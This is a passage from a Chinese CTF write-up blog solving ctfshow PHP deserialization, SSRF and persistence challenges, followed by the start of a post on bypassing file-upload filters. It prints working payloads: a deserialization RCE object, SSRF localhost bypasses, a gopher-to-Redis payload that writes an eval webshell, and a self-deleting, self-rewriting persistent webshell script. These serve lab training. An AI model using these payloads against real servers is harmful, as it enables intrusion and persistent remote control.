        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;</code></pre>

<p>直接利用<code>backDoor</code>类来RCE</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=True;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;&#x27;</span>;
&#125;
<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;
&#125;
<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();
<span class="variable">$a</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span>
<span class="class"><span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>($<span class="title">a</span>));</span></code></pre>

<p>成功执行</p>
<h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);

<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;
    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span>
<span class="class">    &#125;</span>
<span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;
    &#125;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;
        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span>
<span class="class">    &#125;</span>
<span class="class"></span>
<span class="class">&#125;</span>
<span class="class"></span>
<span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;
    &#125;
&#125;

<span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;
    <span class="keyword">public</span> <span class="variable">$code</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;
        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);
    &#125;
&#125;

<span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];
<span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];

<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;
    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;
        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);
    &#125;
    <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>);
&#125;</code></pre>

<p>Cookie不允许O&#x2F;C开头，后面不准接数字</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>

<p>直接访问提示非本地用户禁止访问，既然是SSRF那就是在URL里输入<code>127.0.0.1/flag.php</code></p>
<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>

<pre><code class="highlight plaintext">parse_url这个是用来处理URL的，把它解析成各个部分后存储到数组里面
并且要求头为http/https
问题来了它这个正则写的一拓实，没waf一样</code></pre>

<p><code>flag.php</code>一如既往的非本地无法访问,直接加个头就行</p>
<pre><code class="highlight plaintext">http://127.0.0.1/flag.php</code></pre>

<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span> hacker</code></pre>

<p>对味</p>
<p>那我要用邪门一点的方式来绕过了</p>
<pre><code class="highlight plaintext">http://127.1/flag.php</code></pre>

<p>对于形式这样的ip<code>x.0.0.1</code>可以直接缩写为<code>x.1</code></p>
<p>同时也可以进制替换</p>
<pre><code class="highlight plaintext">127.0.0.0/8是一个环回地址网段，从127.0.0.1 ~ 127.255.255.254都表示localhost
也就是说http://127.1.1.1/flag.php其实也可以的</code></pre>

<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>这里主要的数字都waf了</p>
<p>那么可以有下面几种想法:</p>
<pre><code class="highlight plaintext">域名指向127
302跳转
DNS-Rebinding</code></pre>

<ul>
<li><ol>
<li>在自己的域名里添加一条A记录指向<code>127.0.0.1</code></li>
</ol>
</li>
<li><ol start="2">
<li>在自己的网站页面添加</li>
</ol>
</li>
<li><ol start="3">
<li>自己去ceye.io注册绑定<code>127.0.0.1</code>然后记得前面加r</li>
</ol>
</li>
</ul>
<pre><code class="highlight plaintext">url=http://r.xxxzc8.ceye.io/flag.php</code></pre>

<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];
<span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>将主机名限制到5位以内，那用缩写格式就行</p>
<p><code>127.1或者0(其实就是0.0.0.0)</code></p>
<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><pre><code class="highlight plaintext">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST[&#x27;url&#x27;];
$x=parse_url($url);
if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;
$host=$x[&#x27;host&#x27;];
if((strlen($host)&lt;=3))&#123;
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
&#125;
else&#123;
    die(&#x27;hacker&#x27;);
&#125;
&#125;
else&#123;
    die(&#x27;hacker&#x27;);
&#125;
?&gt;</code></pre>

<p>限制到3位以内，127用不了了0可以</p>
<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;
<span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);
<span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;
<span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;
    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);
&#125;


<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>不是很懂。。</p>
<pre><code class="highlight plaintext">gethostbyname:成功时返回 IPv4 地址，失败时返回主机名。
filter_var() 函数通过指定的过滤器过滤一个变量。
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）。
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）。
FILTER_FLAG_NO_PRIV_RANGE - 要求值不在 RFC 指定的私有范围 IP 内（比如 192.168.0.1）。
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</code></pre>

<p>也就是说这里会验证URL的IP地址不在RFC指定的<code>私有IP</code>范围内（比如 192.168.0.1），且要求值不在<code>保留的IP</code>范围内。</p>
<p>使用DNS重绑定或者用自己的服务器打302</p>
<p>这里可以用第一个，因为有个快捷的网站</p>
<pre><code class="highlight plaintext">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</code></pre>

<p>可以直接重绑定，你输一个不会触发内网ip验证的就可以，发包三次就可以拿到flag</p>
<pre><code class="highlight plaintext">分别是:127.0.0.1 ip!
1.1.1.1（我重绑定的ip
1.1.1.1 flag</code></pre>

<p>为什么是三次?我也不知道，调试一下看看好了</p>
<p>但是怪就怪在我自己调是只有爆ip的，出不来。。</p>
<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);
<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;
    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);
&#125;</code></pre>

<p>要用<code>http://ctf</code>开头<code>show</code>结尾</p>
<p>这里利用@</p>
<pre><code class="highlight plaintext">在URL中，@符号通常用于在基本认证（Basic Authentication）中，将用户名和密码包含在URL中。这种用法的格式是：
http://username:password@hostname/path
在这个格式中，username:password 是登录所需的凭据，@ 符号用来分隔凭据和主机名。然而，这种做法在现代网络应用中不推荐使用，因为它容易导致安全问题，比如泄露用户凭据。</code></pre>

<pre><code class="highlight plaintext">POC:
url=http://ctf.com@127.0.0.1/flag.php#show
url=http://ctf.com@127.0.0.1/flag.php?show</code></pre>

<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><pre><code class="highlight plaintext">打无密码的mysql</code></pre>

<p>随便输一下转到<code>check.php</code></p>
<p>看到<code>POST:returl=https://404.chall.ctf.show/&amp;u=admin</code></p>
<p>那看来这边可以写马发gopher包了</p>
<p>这里介绍一个工具<code>gopherus</code><a href="https://github.com/tarunkant/Gopherus.git">https://github.com/tarunkant/Gopherus.git</a></p>
<p><img src="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/Users\ayano\AppData\Roaming\Typora\typora-user-images\image-20250710143949440.png" alt="image-20250710143949440"></p>
<p><code>_</code>后面的部分记得二次URL编码(因为发送过去时会被编码一次)</p>
<p>写入成功直接连即可</p>
<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
<span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);
<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);
<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);
<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);
<span class="keyword">echo</span> (<span class="variable">$result</span>);
<span class="meta">?&gt;</span></code></pre>

<p>看似平平无奇，实则暗藏杀机。。</p>
<p><code>file://</code>协议读不出东西</p>
<p>尝试用<code>dict://</code>探测一下端口</p>
<p>最后发现redis的端口是开放的</p>
<pre><code class="highlight plaintext">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5Bcmd%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>

<p>记得把<code>_</code>后边编码</p>
<p>接着POST一下，这里不知道为什么POST会卡住然后报错504</p>
<p>但是shell.php是存在的，不知道为什么啊。。希望有大佬可以解答一下</p>
<p>最后直接命令执行即可，喜欢蚁剑也可以</p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="web670"><a href="#web670" class="headerlink" title="web670"></a>web670</h3><pre><code class="highlight plaintext">system(&#x27;echo &quot;&lt;?php eval($_POST[cmd]);?&gt;&quot; &gt;shell.php&#x27;);
var_dump(getcwd()); =&gt;/var/www/html</code></pre>

<p>之后发现无法连上</p>
<p><code>cmd=system(&quot;tac shell.php&quot;);</code>一看没有内容啊。。</p>
<p>看了下其他师傅的博客感觉我思路错了，这里是用<code>file_put_contents</code>来执行</p>
<pre><code class="highlight plaintext">cmd=file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);
在源码里可以看到成功写入</code></pre>

<p>但是连不上啊。。后来找了原因发现要在蚁剑里设置忽略https证书</p>
<p>然后check发现把目录清光了。。</p>
<p>草拟吗不死马，来</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);
    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);
    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);
    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;
    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>;
    <span class="keyword">while</span> (<span class="number">1</span>) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);
        <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);
    &#125;
<span class="meta">?&gt;</span></code></pre>

<pre><code class="highlight php"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;17.php&#x27;</span>, <span class="string">&#x27;&lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&#x27;shell.php\&#x27;;$code = \&#x27;&lt;?php @eval($_POST[1]);?&gt;\&#x27;;while (1) &#123;file_put_contents($file, $code);usleep(5000);&#125;?&gt;&#x27;</span>);</code></pre>

<p>解析一下</p>
<pre><code class="highlight plaintext">set_time_limit()函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）
ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True或者1，则忽略与用户的断开）
unlink(FILE)函数：删除文件（防止文件落地被检测工具查杀）
file_put_contents函数：将一个字符串写入该文件中
usleep函数：延迟执行当前脚本数微秒，即条件竞争</code></pre>

]]></content>
      <tags>
        <tag>-Web -CTF -WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾)</p>
<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>前端检测上传文件的后缀，js检测直接禁用js</p>
<h2 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h2><h3 id="检测content-type"><a href="#检测content-type" class="headerlink" title="检测content-type"></a>检测content-type</h3><p>检测你发包的Content-Type参数来判断文件上传类型</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250416151018927.png" alt="image-20250416151018927"></p>
<p>一般你改一下content-type就可以绕过了</p>
<h3 id="检测文件头判断文件类型"><a href="#检测文件头判断文件类型" class="headerlink" title="检测文件头判断文件类型"></a>检测文件头判断文件类型</h3><p>字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头</p>
<p>这种时候伪造一下就可以</p>
<pre><code class="highlight scss"><span class="built_in">gif</span>(GIF89a) : <span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span> 
jpg、jpeg : FF D8 FF 
png : <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span> <span class="number">0</span>D <span class="number">0</span>A</code></pre>

<p>用winhex、010editor等十六进制处理工具，在数据最前面添加图片的文件头，从而绕过检测，或者你直接在包的头写个GIF89a也是可以过的</p>
<h3 id="后端检测文件拓展名"><a href="#后端检测文件拓展名" class="headerlink" title="后端检测文件拓展名"></a>后端检测文件拓展名</h3><p>用拓展名的黑名单来检测文件拓展名从而防止危险文件的上传</p>
<p>绕过:</p>
<p>1)使用一些特殊扩展名来绕过,<code>php</code>可以用php3、php4、php5代替</p>
<p>2)大小写混淆绕过</p>
<p>3)在文件名后加<code>.</code>(空格，点，空格)，利用windows特性绕过</p>
<p>4)在文件名后加<code>::$data</code>绕过(<strong>NTFS流</strong>读入)</p>
<p>5)有替换的话可以双写绕过</p>
<hr>
<p>当然也可以是白名单只让特定的文件上传</p>
<p>绕过:</p>
<p>存储路径可以使用%00在最后进行截断，（注意：GET型可以对%00自动解码，但POST型不能，需要在二进制中修改&#x2F;&#x2F;打开你的010喵，用空格占个位来输00）</p>
<h3 id="后端检测文件内容"><a href="#后端检测文件内容" class="headerlink" title="后端检测文件内容"></a>后端检测文件内容</h3><h4 id="文件内容替换"><a href="#文件内容替换" class="headerlink" title="文件内容替换"></a>文件内容替换</h4><p>检测原理：</p>
<p>在后端处理上传的文件时，会将将文件中的敏感字符替换掉。<br>参考代码</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$path</span> = <span class="string">&quot;./uploads&quot;</span>;
<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);
<span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$content</span>);
<span class="variable">$file</span> = <span class="variable">$path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];

<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;myfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>)) &#123;
        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);
        <span class="keyword">echo</span> <span class="string">&#x27;Success!&lt;br&gt;&#x27;</span>;
&#125; <span class="keyword">else</span> &#123;
        <span class="keyword">echo</span> <span class="string">&#x27;Error!&lt;br&gt;&#x27;</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

